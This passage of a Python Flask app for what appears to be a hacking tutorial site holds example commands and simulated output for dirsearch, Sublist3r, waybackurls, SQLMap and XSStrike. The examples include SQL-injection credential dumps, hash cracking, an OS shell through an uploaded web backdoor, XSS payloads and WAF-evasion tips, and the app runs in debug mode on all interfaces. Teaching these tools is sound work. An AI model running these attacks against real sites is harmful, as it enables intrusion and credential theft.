            {"flag": "-r", "desc": "Recursive"},
            {"flag": "-t", "desc": "Threads"},
            {"flag": "--exclude-status", "desc": "Filter out status codes"},
            {"flag": "--random-agent", "desc": "Random User-Agent"}
        ],
        "examples": [
            {
                "title": "Recursive Scan",
                "command": "dirsearch -u https://target.com -e php,html,js,json -r -t 30",
                "explanation": "Scans, then recurses into found directories.",
                "output": """  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, html, js, json | HTTP method: GET | Threads: 30
Wordlist size: 12480

Target: https://target.com

[14:23:45] Starting:
[14:23:47] 200 -  12KB - /index.php
[14:23:47] 301 -  178B - /admin  →  /admin/
[14:23:48] 200 -  2KB - /login
[14:23:48] 200 -  4KB - /api/
[14:23:49] 403 -  287B - /backup/
[14:23:50] 200 -  1KB - /config.php
[14:23:51] 200 -  45KB - /setup.sql

[14:23:52] Starting: /admin/
[14:23:53] 200 -  8KB - /admin/dashboard.php
[14:23:54] 200 -  3KB - /admin/users.php
[14:23:55] 200 -  2KB - /admin/config.php

Task Completed""",
                "category": "Recursive"
            }
        ],
        "failures": [
            {
                "title": "Connection Timeout",
                "command": "dirsearch -u https://slow-site.com -t 50",
                "explanation": "Server too slow or rate-limited.",
                "output": """[14:23:45] Starting:
[14:24:15] WARNING: Connection timeout for 30% of requests
[14:24:45] ERROR: Too many timeouts — reducing threads
[14:25:00] Task Completed (partial)
  Total requests: 234
  Failed: 187 (timeouts)

⚠️ Server rate-limited you!
  • Reduce threads: -t 5
  • Add delay: --delay 1s
  • Check WAF"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Queue URLs", "desc": "Builds list from wordlist × extensions", "from": "Dirsearch", "to": "Queue", "data": "12480 combos", "color": "#8e44ad"},
            {"step": 2, "title": "Threads run", "desc": "30 parallel workers", "from": "Dirsearch", "to": "Workers", "data": "30 threads", "color": "#3498db"},
            {"step": 3, "title": "Recurse on hits", "desc": "Found /admin/ → scan inside it", "from": "Workers", "to": "Queue", "data": "New URLs added", "color": "#f39c12"},
            {"step": 4, "title": "Filter status", "desc": "Skip 404s, log 200/301/403", "from": "Target", "to": "Report", "data": "Findings recorded", "color": "#27ae60"}
        ]
    },
    {
        "id": "sublist3r",
        "name": "Sublist3r",
        "icon": "🔗",
        "color": "#e67e22",
        "category": "Subdomain Enum",
        "tagline": "Passive subdomain discovery",
        "description": "Sublist3r enumerates subdomains using multiple OSINT sources — Google, Bing, Yahoo, Baidu, VirusTotal, Netcraft, and more. Passive — doesn't touch the target.",
        "install": "pip3 install sublist3r",
        "common_flags": [
            {"flag": "-d", "desc": "Domain to enumerate"},
            {"flag": "-b", "desc": "Enable bruteforce (also uses wordlist)"},
            {"flag": "-p", "desc": "Ports to scan on found subdomains"},
            {"flag": "-v", "desc": "Verbose"},
            {"flag": "-t", "desc": "Threads for bruteforce"},
            {"flag": "-o", "desc": "Output file"}
        ],
        "examples": [
            {
                "title": "Basic Passive Enumeration",
                "command": "sublist3r -d target.com",
                "explanation": "Queries 30+ OSINT sources passively.",
                "output": """                 ____        _     _ _     _   _____
                / ___| _   _| |__ | (_)___| |_|___ / _ __
                \\___ \\| | | | '_ \\| | / __| __| |_ \\| '__|
                 ___) | |_| | |_) | | \\__ \\ |_ ___) | |
                |____/ \\__,_|_.__/|_|_|___/\\__|____/|_|

                # Coded By Ahmed Aboul-Ela - @aboul3la

[-] Enumerating subdomains now for target.com
[-] Searching now in Baidu...
[-] Searching now in Yahoo...
[-] Searching now in Google...
[-] Searching now in Bing...
[-] Searching now in Ask...
[-] Searching now in Netcraft...
[-] Searching now in DNSdumpster...
[-] Searching now in Virustotal...
[-] Searching now in ThreatCrowd...
[-] Searching now in SSL Certificates...
[-] Searching now in PassiveDNS...

[+] Total Unique Subdomains Found: 47
admin.target.com
api.target.com
blog.target.com
dev.target.com
docs.target.com
mail.target.com
staging.target.com
test.target.com
vpn.target.com
www.target.com
...""",
                "category": "Passive"
            },
            {
                "title": "With Bruteforce + Port Scan",
                "command": "sublist3r -d target.com -b -p 80,443,8080",
                "explanation": "Combines passive + active bruteforce, scans ports.",
                "output": """[-] Enumerating subdomains now for target.com
[-] Searching now in Baidu, Yahoo, Google...
[+] Total Unique Subdomains Found (passive): 47

[-] Starting bruteforce with wordlist...
[-] Total Unique Subdomains Found (with bruteforce): 63

[-] Starting port scan on found subdomains...
admin.target.com: 80 (open), 443 (open)
api.target.com: 443 (open)
dev.target.com: 22 (open), 80 (open), 8080 (open)  ← dev server exposed!
staging.target.com: 80 (open)

[+] 63 subdomains found""",
                "category": "Active"
            }
        ],
        "failures": [
            {
                "title": "API Rate Limited",
                "command": "sublist3r -d target.com",
                "explanation": "Some APIs rate-limit or block queries.",
                "output": """[-] Enumerating subdomains now for target.com
[-] Searching now in Google...
[!] Google blocked the request (CAPTCHA).
[!] Bing returned 0 results.
[-] Searching now in VirusTotal...
[!] VirusTotal API quota exceeded.

[+] Total Unique Subdomains Found: 8  ← only a few!

⚠️ Some sources failed:
  • Add API keys for higher limits (VirusTotal, Shodan)
  • Use other tools: amass, findomain
  • Wait and retry later"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Query OSINT", "desc": "Sends queries to 30+ sources", "from": "Sublist3r", "to": "Google/Bing/VT", "data": "site:target.com", "color": "#e67e22"},
            {"step": 2, "title": "Parse results", "desc": "Extracts subdomains via regex", "from": "Sources", "to": "Sublist3r", "data": "admin, api, mail...", "color": "#3498db"},
            {"step": 3, "title": "Deduplicate", "desc": "Removes duplicates across sources", "from": "Sublist3r", "to": "Set", "data": "47 unique", "color": "#f39c12"},
            {"step": 4, "title": "Optional bruteforce", "desc": "Try wordlist prefixes", "from": "Sublist3r", "to": "DNS", "data": "+16 more", "color": "#27ae60"}
        ]
    },
    {
        "id": "waybackurls",
        "name": "Waybackurls",
        "icon": "⏳",
        "color": "#9b59b6",
        "category": "Historical URLs",
        "tagline": "Fetch URLs from Wayback Machine",
        "description": "Waybackurls fetches all URLs of a domain from the Wayback Machine. Great for finding forgotten endpoints, parameters, and old files.",
        "install": "go install github.com/tomnomnom/waybackurls@latest",
        "common_flags": [
            {"flag": "domain", "desc": "Positional argument"},
            {"flag": "-dates", "desc": "Show timestamps"},
            {"flag": "-no-subs", "desc": "Exclude subdomains"}
        ],
        "examples": [
            {
                "title": "Basic Usage",
                "command": "echo 'target.com' | waybackurls",
                "explanation": "Fetches every URL ever archived for target.com.",
                "output": """https://target.com/
https://target.com/about
https://target.com/admin/login.php
https://target.com/api/v1/users?id=1
https://target.com/api/v2/config.json
https://target.com/backup.zip
https://target.com/index.php?page=home
https://target.com/index.php?page=contact
https://target.com/old-site/login.php
https://target.com/uploads/secret.pdf
https://target.com/wp-content/uploads/2020/01/db_backup.sql
...""",
                "category": "Basic"
            },
            {
                "title": "Filter for Parameters",
                "command": "echo 'target.com' | waybackurls | grep '?' | sort -u",
                "explanation": "Only URLs with query parameters — potential injection points.",
                "output": """https://target.com/api/v1/users?id=1
https://target.com/api/v1/posts?author=admin
https://target.com/index.php?page=home
https://target.com/index.php?redirect=/dashboard
https://target.com/product.php?cat=1&id=15
https://target.com/search?q=test&lang=en""",
                "category": "Parameters"
            }
        ],
        "failures": [
            {
                "title": "No Results",
                "command": "echo 'newdomain.com' | waybackurls",
                "explanation": "Domain is too new or never archived.",
                "output": """(empty)

⚠️ No archived URLs found!
  • Domain may be brand new
  • Wayback Machine hasn't crawled it
  • Try: curl "http://archive.org/wayback/available?url=newdomain.com" """
            }
        ],
        "simulation": [
            {"step": 1, "title": "Query Wayback", "desc": "Calls web.archive.org CDX API", "from": "Waybackurls", "to": "Archive.org", "data": "?url=target.com/*", "color": "#9b59b6"},
            {"step": 2, "title": "Stream results", "desc": "Archive returns all snapshots", "from": "Archive.org", "to": "Waybackurls", "data": "10,000 URLs", "color": "#3498db"},
            {"step": 3, "title": "Deduplicate", "desc": "Removes duplicates, keeps unique", "from": "Waybackurls", "to": "Set", "data": "2456 unique", "color": "#f39c12"},
            {"step": 4, "title": "Output", "desc": "Prints URLs — pipe to next tool", "from": "Waybackurls", "to": "File", "data": "urls.txt", "color": "#27ae60"}
        ]
    }
]

# ==================== WEB EXPLOIT TOOLS ====================
WEB_EXPLOIT_TOOLS = [
    {
        "id": "sqlmap",
        "name": "SQLMap",
        "icon": "💉",
        "color": "#e74c3c",
        "category": "SQL Injection",
        "tagline": "Automated SQL injection & DB takeover",
        "description": "SQLMap is the industry standard for automated SQL injection detection and exploitation. It supports MySQL, PostgreSQL, MSSQL, Oracle, SQLite, and more.",
        "install": "sudo apt install sqlmap",
        "common_flags": [
            {"flag": "-u", "desc": "Target URL"},
            {"flag": "--data", "desc": "POST data"},
            {"flag": "--dbs", "desc": "Enumerate databases"},
            {"flag": "--tables", "desc": "Enumerate tables"},
            {"flag": "--columns", "desc": "Enumerate columns"},
            {"flag": "--dump", "desc": "Dump table data"},
            {"flag": "--os-shell", "desc": "Get OS shell via SQLi"},
            {"flag": "--batch", "desc": "Never ask for input"},
            {"flag": "--level", "desc": "1-5 (test depth)"},
            {"flag": "--risk", "desc": "1-3 (test damage)"}
        ],
        "examples": [
            {
                "title": "Basic SQLi Detection",
                "command": "sqlmap -u 'http://target.com/product.php?id=1' --batch",
                "explanation": "Tests the id parameter for SQL injection.",
                "output": """        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS
[INFO] testing if the target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] GET parameter 'id' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] testing for SQL injection on GET parameter 'id'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
[INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY'
[INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based' injectable
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[INFO] GET parameter 'id' is 'Generic UNION query' injectable
sqlmap identified the following injection point(s) with a total of 89 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5838=5838

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY
    Payload: id=1 AND (SELECT 4256 FROM(SELECT COUNT(*),CONCAT(...))x)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6789 FROM (SELECT(SLEEP(5)))xyz)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x71,...),NULL,NULL,NULL-- -
---
[INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04
web application technology: PHP 7.4.3, Apache 2.4.41
back-end DBMS: MySQL >= 5.0
[INFO] fetched data logged to text files under '/root/.sqlmap/output/target.com'""",
                "category": "Detection"
            },
            {
                "title": "Enumerate Databases",
                "command": "sqlmap -u 'http://target.com/product.php?id=1' --dbs --batch",
                "explanation": "Lists all databases on the server.",
                "output": """[INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] target_db    ← our target""",
                "category": "Enumeration"
            },
            {
                "title": "Dump Tables",
                "command": "sqlmap -u 'http://target.com/product.php?id=1' -D target_db --tables --batch",
                "explanation": "Lists all tables in target_db.",
                "output": """Database: target_db
[5 tables]
+---------------+
| users         |
| products      |
| orders        |
| admin_users   |  ← juicy!
| sessions      |
+---------------+""",
                "category": "Enumeration"
            },
            {
                "title": "Dump User Credentials",
                "command": "sqlmap -u 'http://target.com/product.php?id=1' -D target_db -T users --dump --batch",
                "explanation": "Dumps the users table with credentials.",
                "output": """Database: target_db
Table: users
[3 entries]
+----+-------------+----------------------------------+----------+
| id | email       | password                         | username |
+----+-------------+----------------------------------+----------+
| 1  | admin@x.com | 5f4dcc3b5aa765d61d8327deb882cf99 | admin    |
| 2  | bob@x.com   | e10adc3949ba59abbe56e057f20f883e | bob      |
| 3  | alice@x.com | 25d55ad283aa400af464c76d713c07ad | alice    |
+----+-------------+----------------------------------+----------+

[INFO] recognized possible password hashes — do you want to crack them via a dictionary-based attack? [Y/n]

[INFO] using hash method 'md5_generic_passwd'
[INFO] cracked password 'password' for user 'admin'
[INFO] cracked password '123456' for user 'bob'""",
                "category": "Exploit"
            },
            {
                "title": "Get OS Shell",
                "command": "sqlmap -u 'http://target.com/product.php?id=1' --os-shell --batch",
                "explanation": "Attempts to get an interactive OS shell via SQLi.",
                "output": """[INFO] the back-end DBMS is MySQL
[INFO] going to use a web backdoor for command prompt
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4

[INFO] uploading a web backdoor
[INFO] calling the web backdoor
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

os-shell> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...""",
                "category": "Exploit"
            }
        ],
        "failures": [
            {
                "title": "Target Not Vulnerable",
                "command": "sqlmap -u 'http://secure.com/page.php?id=1' --batch",
                "explanation": "The site uses prepared statements — no SQLi possible.",
                "output": """[INFO] testing connection to the target URL
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] testing for SQL injection on GET parameter 'id'
[INFO] testing 'AND boolean-based blind'
[INFO] testing 'MySQL >= 5.0 AND error-based'
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[INFO] testing 'Generic UNION query'
[WARNING] GET parameter 'id' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable.

⚠️ Not vulnerable to SQLi.
  Possible reasons:
  • Site uses prepared statements (good practice!)
  • WAF is filtering payloads
  • Escaping is done correctly
  • Parameter isn't actually used in a query"""
            },
            {
                "title": "WAF Blocking",
                "command": "sqlmap -u 'https://cloudflare-site.com/?id=1' --batch",
                "explanation": "Cloudflare/AWS WAF blocks all payloads.",
                "output": """[INFO] testing connection to the target URL
[WARNING] the web server responded with the following HTTP error code: 403
[CRITICAL] page not found (404)
[WARNING] WAF/IPS identified as Cloudflare
[INFO] no parameter(s) found for testing

⚠️ WAF blocking all requests!
  • Use --tamper scripts: --tamper=space2comment,charencode
  • Slow down: --delay 2 --threads 1
  • Random User-Agent: --random-agent
  • Use a proxy: --proxy=http://proxy:8080"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Test URL", "desc": "Verifies target is reachable", "from": "SQLMap", "to": "Target", "data": "GET /?id=1", "color": "#e74c3c"},
            {"step": 2, "title": "Detect WAF", "desc": "Sends benign + malicious probes", "from": "SQLMap", "to": "Target", "data": "Checking WAF", "color": "#f39c12"},
            {"step": 3, "title": "Test payloads", "desc": "Tries AND/OR, UNION, time-based", "from": "SQLMap", "to": "Target", "data": "89 payloads", "color": "#3498db"},
            {"step": 4, "title": "Confirm injection", "desc": "Payloads trigger error/delay", "from": "Target", "to": "SQLMap", "data": "Vulnerable!", "color": "#9b59b6"},
            {"step": 5, "title": "Enumerate DB", "desc": "Extract databases, tables, columns", "from": "SQLMap", "to": "DB", "data": "target_db.users", "color": "#27ae60"},
            {"step": 6, "title": "Dump + crack", "desc": "Extract rows, crack hashes", "from": "SQLMap", "to": "Output", "data": "admin:password", "color": "#c0392b"}
        ]
    },
    {
        "id": "xsstrike",
        "name": "XSStrike",
        "icon": "🎯",
        "color": "#f39c12",
        "category": "XSS Detection",
        "tagline": "Advanced XSS detection & exploitation",
        "description": "XSStrike is a powerful XSS scanner with intelligent payload generation, WAF detection, and context-aware fuzzing. Finds reflected, stored, and DOM-based XSS.",
        "install": "git clone https://github.com/s0md3v/XSStrike && pip3 install -r requirements.txt",
        "common_flags": [
            {"flag": "-u", "desc": "Target URL"},
            {"flag": "--data", "desc": "POST data"},
            {"flag": "--crawl", "desc": "Crawl the site first"},
            {"flag": "--fuzzer", "desc": "Fuzz parameters"},
            {"flag": "--blind", "desc": "Blind XSS testing"}
        ],
        "examples": [
            {
                "title": "Basic XSS Scan",
                "command": "python3 xsstrike.py -u 'http://target.com/search?q=test'",
                "explanation": "Tests the 'q' parameter for XSS vulnerabilities.",
                "output": """XSStrike v3.1.5

[~] Checking for DOM vulnerabilities
[+] WAF Status: Offline
[!] Testing parameter: q
[!] Reflections found: 1
[~] Analysing reflections
[~] Generating payloads
[!] Payloads generated: 3072
------------------------------------------------------------
[+] Payload: <script>alert(1)</script>
[!] Efficiency: 100
[!] Confidence: 10
[?] Would you like to continue scanning? [y/N] y
------------------------------------------------------------
[+] Payload: <svg/onload=alert(1)>
[!] Efficiency: 100
[!] Confidence: 10
------------------------------------------------------------
[+] Payload: "><img src=x onerror=alert(1)>
[!] Efficiency: 100
[!] Confidence: 10
------------------------------------------------------------
[+] Vulnerable to XSS!""",
                "category": "Basic"
            },
            {
                "title": "POST Form XSS",
                "command": "python3 xsstrike.py -u 'http://target.com/comment' --data 'name=test&comment=hello'",
                "explanation": "Tests POST parameters for XSS.",
                "output": """XSStrike v3.1.5

[~] Testing parameter: name
[!] No reflection
[~] Testing parameter: comment
[!] Reflections found: 1
[~] Testing reflection context (HTML body)
[~] Generating payloads
[+] Payload: <script>alert(1)</script>
[+] Payload: <img src=x onerror=alert(1)>
[+] Payload: <svg/onload=alert('XSS')>

[+] Target is vulnerable to XSS!""",
                "category": "POST"
            },
            {
                "title": "Crawl + Fuzz",
                "command": "python3 xsstrike.py -u 'http://target.com' --crawl --fuzzer",
                "explanation": "Crawls the site then fuzzes all discovered parameters.",
                "output": """XSStrike v3.1.5

[~] Crawling http://target.com
[+] Found 15 URLs
[+] Found 47 parameters
[~] Filtering
[~] Fuzzing 12 parameters

[!] Testing http://target.com/search?q=FUZZ
[+] Reflected parameter!

[+] Target: http://target.com/search?q=test
[+] Vulnerable parameter: q
[+] Payload: <script>alert(document.domain)</script>

[~] Results saved to xsstrike_report.json""",
                "category": "Advanced"
            }
        ],
        "failures": [
            {
                "title": "No XSS Found",
                "command": "python3 xsstrike.py -u 'http://secure.com/search?q=test'",
                "explanation": "Input is properly encoded — no XSS.",
                "output": """XSStrike v3.1.5

[~] Checking for DOM vulnerabilities
[+] WAF Status: Offline
[!] Testing parameter: q
[!] Reflections found: 1
[~] Analysing reflections
[~] Generating payloads
[!] Payloads generated: 3072
------------------------------------------------------------
[!] No payloads triggered XSS

⚠️ Target is NOT vulnerable to XSS.
  Possible reasons:
  • Input properly HTML-encoded (&lt; &gt;)
  • CSP header blocks inline scripts
  • WAF filtering XSS payloads
  • Reflection context is safe (inside <textarea>, etc.)"""
            },
            {
                "title": "WAF Blocking",
                "command": "python3 xsstrike.py -u 'https://cloudflare-site.com/?q=test'",
                "explanation": "Cloudflare detects payload patterns and blocks.",
                "output": """XSStrike v3.1.5

[~] Checking for DOM vulnerabilities
[+] WAF Status: Cloudflare (detected)
[!] Testing parameter: q
[!] Server returned 403 Forbidden
[!] WAF is blocking payloads

⚠️ WAF blocking!
  Try:
  • --headers "X-Forwarded-For: 1.2.3.4"
  • Slow down requests
  • Encode payloads differently"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Test parameter", "desc": "Sends test string in q param", "from": "XSStrike", "to": "Target", "data": "q=XStrikeTest", "color": "#f39c12"},
            {"step": 2, "title": "Check reflection", "desc": "Looks for test string in response", "from": "Target", "to": "XSStrike", "data": "Reflected in HTML body", "color": "#3498db"},
            {"step": 3, "title": "Detect context", "desc": "Identifies if inside HTML, attribute, script", "from": "XSStrike", "to": "Context Analyzer", "data": "Inside <div>", "color": "#9b59b6"},
            {"step": 4, "title": "Generate payloads", "desc": "Creates context-aware payloads", "from": "XSStrike", "to": "Payload Generator", "data": "3072 payloads", "color": "#e74c3c"},
            {"step": 5, "title": "Test payloads", "desc": "Sends each payload, checks for trigger", "from": "XSStrike", "to": "Target", "data": "<script>alert(1)</script>", "color": "#c0392b"},
            {"step": 6, "title": "Confirm XSS", "desc": "Browser would execute JS", "from": "Target", "to": "Attacker", "data": "XSS confirmed", "color": "#27ae60"}
        ]
    }
]

# ==================== ROUTES ====================

# ==================== ROUTES ====================
@app.route('/')
def index():
    return render_template('index.html', layers=OSI_LAYERS)

@app.route('/layer/<int:layer_num>')
def layer_detail(layer_num):
    if layer_num not in OSI_LAYERS:
        abort(404)
    layer = OSI_LAYERS[layer_num]
    layer_devices = [DEVICES[k] for k in layer["device_keys"] if k in DEVICES]
    return render_template('layer.html', layer=layer, all_layers=OSI_LAYERS, devices=layer_devices)

@app.route('/tcp')
def tcp():
    return render_template('tcp.html', flags=TCP_FLAGS, handshake=TCP_HANDSHAKE, termination=TCP_TERMINATION)

@app.route('/ip-ports')
def ip_ports():
    return render_template('ip_ports.html',
                         ip_addresses=IP_ADDRESSES,
                         port_categories=PORT_CATEGORIES,
                         simulation=IP_PORT_SIMULATION)


@app.route('/subnetting')
def subnetting():
    return render_template('subnetting.html',
                         bits=SUBNET_BITS,
                         ip_classes=IP_CLASSES,
                         formulas=SUBNET_FORMULAS,
                         examples=SUBNET_EXAMPLES,
                         arp_steps=ARP_STEPS,
                         arp_table=ARP_TABLE_EXAMPLE,
                         arp_commands=ARP_COMMANDS,
                         arp_fping=ARP_FPING_EXAMPLE,
                         arp_spoof=ARP_SPOOF_STEPS,
                         manual_config=MANUAL_IP_CONFIG)




# ==================== LINUX ROUTES ====================
@app.route('/linux')
def linux_hub():
    return render_template('linux_hub.html',
                         intro=LINUX_INTRO,
                         filesystem=LINUX_FILESYSTEM,
                         commands=LINUX_COMMANDS,
                         shells=LINUX_SHELLS)

@app.route('/linux/filesystem')
def linux_filesystem():
    return render_template('linux_filesystem.html', filesystem=LINUX_FILESYSTEM)

@app.route('/linux/commands')
def linux_commands():
    return render_template('linux_commands.html', commands=LINUX_COMMANDS)

@app.route('/linux/permissions')
def linux_permissions():
    return render_template('linux_permissions.html', permissions=LINUX_PERMISSIONS)

@app.route('/linux/users')
def linux_users():
    return render_template('linux_users.html',
                         passwd_data=LINUX_PASSWD_FILE,
                         shadow_data=LINUX_SHADOW_FILE,
                         groups_data=LINUX_GROUPS)

@app.route('/linux/sudo')
def linux_sudo():
    return render_template('linux_sudo.html', sudo_data=LINUX_SUDO)

@app.route('/linux/shells')
def linux_shells():
    return render_template('linux_shells.html', shells=LINUX_SHELLS)

@app.route('/linux/processes')
def linux_processes():
    return render_template('linux_processes.html', processes=LINUX_PROCESSES)



# ==================== WEB HACKING ROUTES ====================
@app.route('/web')
def web_hub():
    return render_template('web_hub.html')

@app.route('/web/how-it-works')
def web_how_it_works():
    return render_template('web_how_it_works.html',
                         url=URL_ANATOMY,
                         methods=HTTP_METHODS,
                         headers=HTTP_HEADERS,
                         status=HTTP_STATUS,
                         flow=WEB_REQUEST_FLOW)

@app.route('/web/owasp')
def web_owasp():
    return render_template('web_owasp.html', owasp=OWASP_TOP10)

@app.route('/web/owasp/<vuln_id>')
def web_owasp_detail(vuln_id):
    vuln = next((v for v in OWASP_TOP10 if v['id'] == vuln_id), None)
    if not vuln:
        abort(404)
    return render_template('web_owasp_detail.html', vuln=vuln, all_vulns=OWASP_TOP10)

@app.route('/web/recon')
def web_recon():
    return render_template('web_recon.html', tools=WEB_RECON_TOOLS)

@app.route('/web/exploit')
def web_exploit():
    return render_template('web_exploit.html', tools=WEB_EXPLOIT_TOOLS)





@app.route('/concepts')
def concepts():
    return render_template('concepts.html', concepts=CONCEPTS)

@app.route('/concept/<concept_id>')
def concept_detail(concept_id):
    if concept_id not in CONCEPTS:
        abort(404)
    return render_template('concept_detail.html', concept=CONCEPTS[concept_id], all_concepts=CONCEPTS)
@app.route('/udp')
def udp():
    return render_template('udp.html')


@app.route('/osi')
def osi():
    return render_template('index1.html', layers=OSI_LAYERS)

@app.route('/ports')
def ports():
    return render_template('ports.html', ports=COMMON_PORTS)

@app.route('/iot')
def iot():
    return render_template('iot.html', protocols=IOT_PROTOCOLS)

# ==================== API ENDPOINTS ====================
@app.route('/api/layers')
def api_layers():
    return jsonify(OSI_LAYERS)


@app.route('/port-scan')
def port_scan():
    return render_template('port_scan.html',
                         scan_types=SCAN_TYPES,
                         nmap_commands=NMAP_COMMANDS,
                         flag_matrix=TCP_FLAG_SCAN_MATRIX,
                         port_states=PORT_STATES,
                         scan_scenarios=SCAN_SCENARIOS)

@app.route('/bruteforce/online')
def bruteforce_online():
    return render_template('bruteforce_online.html', tools=ONLINE_TOOLS)

@app.route('/bruteforce/offline')
def bruteforce_offline():
    return render_template('bruteforce_offline.html', tools=OFFLINE_TOOLS, wordlists=WORDLIST_PATHS)


@app.route('/api/device/<device_key>')
def api_device(device_key):
    if device_key not in DEVICES:
        abort(404)
    return jsonify(DEVICES[device_key])

@app.route('/api/port/<int:port_num>')
def api_port(port_num):
    if port_num not in PORT_SIMULATIONS:
        return jsonify({"error": "No simulation available"}), 404
    return jsonify(PORT_SIMULATIONS[port_num])

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
